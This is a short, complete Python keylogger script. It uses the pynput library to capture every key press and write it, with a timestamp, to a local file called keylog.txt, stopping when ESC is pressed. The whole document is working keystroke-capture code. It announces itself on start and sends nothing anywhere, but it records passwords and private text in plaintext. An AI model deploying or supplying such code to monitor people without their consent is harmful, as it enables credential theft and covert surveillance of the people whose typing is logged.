from pynput import keyboard
from datetime import datetime

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open('keylog.txt', 'a') as f:
            if hasattr(key, 'char') and key.char:
                f.write(f'[{timestamp}] Key: {key.char}\n')
            else:
                f.write(f'[{timestamp}] Special: {key}\n')
    except Exception:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False

print("Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()